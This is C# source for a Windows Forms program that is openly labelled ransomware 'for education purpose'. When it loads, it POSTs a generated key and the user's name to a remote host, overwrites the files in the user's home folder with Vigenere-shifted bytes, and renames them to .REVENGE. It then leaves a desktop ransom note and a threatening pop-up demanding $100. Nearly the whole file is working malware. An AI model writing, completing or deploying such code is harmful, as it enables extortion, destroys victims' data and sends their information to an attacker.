﻿using System;
using System.Data;
using System.Linq;
using System.Windows.Forms;
using System.IO;
using System.Net;
using System.Web.Script.Serialization;

namespace Ransomeware
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        //.NET FRAMEWORK 4.0
        //FOR EDUCATION PURPOSE.
        //NOTE: I didn't try this ransomeware but i think it works perfectly, try it on a virtual machine and tell me if you face any problem in issues.
        private void Form1_Load(object sender, EventArgs e)
        {
            var directory = Directory.GetFiles(@"C:\Users\" + Environment.UserName);
            string password = GeneratePassword(16);
            string host = "your host url for example you can use glitch.com to create node.js express app";

            //sending a post request to your host includes the password to decrypt files
            var httpWebRequest = (HttpWebRequest)WebRequest.Create(host);
            httpWebRequest.ContentType = "application/json";
            httpWebRequest.Method = "POST";

            using (var streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
            {
                string json = new JavaScriptSerializer().Serialize(new
                {
                    pass = password,
                    user = Environment.UserName
                });

                streamWriter.Write(json);
                streamWriter.Flush();
                streamWriter.Close();
            }

            var httpResponse = (HttpWebResponse)httpWebRequest.GetResponse();
            using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
            {
                var result = streamReader.ReadToEnd();
            }


            //encrypting all files in the victim user directory .
            foreach (var file in directory)
            {
                byte[] bytesEncrypted = Encrypt(File.ReadAllBytes(file), password);
                File.WriteAllBytes(file, bytesEncrypted);
                var filename = file.Split('.')[0];
                File.Move(file, filename + ".REVENGE");
            }

            File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "//ReadToRestore.txt", @"if you want to restore your files, send me 100$");
            MessageBox.Show("All your files gone, send me 100$ to restore your files or die", "GG", MessageBoxButtons.OK, MessageBoxIcon.Warning);

            //---
            //decrypt
            //File.WriteAllBytes(Environment.CurrentDirectory + "//a.REVENGE", decryptByteVigenere(File.ReadAllBytes(Environment.CurrentDirectory + "//a.REVENGE"), "123456"));
            //File.Move(Environment.CurrentDirectory + "//a.REVENGE", Environment.CurrentDirectory + "//a.txt");
            //---

        }

        private static Random random = new Random();
        public static string GeneratePassword(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        public static byte[] Encrypt(byte[] plaintext, string key)
        {

            byte[] result = new Byte[plaintext.Length];

            key = key.Trim().ToUpper();

            int keyIndex = 0;
            int keylength = key.Length;

            for (int i = 0; i < plaintext.Length; i++)
            {
                keyIndex = keyIndex % keylength;
                int shift = (int)key[keyIndex] - 65;
                result[i] = (byte)(((int)plaintext[i] + shift) % 256);
                keyIndex++;
            }

            return result;
        }
        
        //Decrypt Vigenere Algorithm Function..
        //public static byte[] decryptByteVigenere(byte[] ciphertext, string key)
        //{
        //    byte[] result = new Byte[ciphertext.Length];

        //    key = key.Trim().ToUpper();

        //    int keyIndex = 0;
        //    int keylength = key.Length;

        //    for (int i = 0; i < ciphertext.Length; i++)
        //    {
        //        keyIndex = keyIndex % keylength;
        //        int shift = (int)key[keyIndex] - 65;
        //        result[i] = (byte)(((int)ciphertext[i] + 256 - shift) % 256);
        //        keyIndex++;
        //    }

        //    return result;
        //}

    }
}
